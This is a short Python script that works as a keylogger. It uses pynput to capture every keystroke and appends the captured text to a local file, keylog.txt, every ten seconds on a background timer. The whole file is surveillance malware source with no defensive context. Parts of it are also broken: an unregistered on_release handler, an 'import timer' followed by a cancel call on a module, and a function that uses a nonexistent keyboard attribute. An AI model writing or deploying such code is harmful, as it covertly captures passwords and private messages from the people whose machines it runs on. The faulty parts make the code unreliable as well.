import threading
import time
import pynput.keyboard
from pynput import keyboard

log = ""


def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " [" + str(key) + "] "


def write_log():
    global log
    with open("keylog.txt", "a") as f:
        f.write(log)
    log = ""
    timer = threading.Timer(10, write_log)
    timer.daemon = True
    timer.start()

def on_release(key):
    from pynput import keyboard
    if key == keyboard.Key.esc:
        write_log()
        import timer
        timer.cancel()

def workspace(key):
    from pynput.keyboard import Listener
    
    if key == keyboard.workspace:
        keyboard.workspace = " "



listener = pynput.keyboard.Listener(on_press = on_press)
listener.start()
write_log()
listener.join()
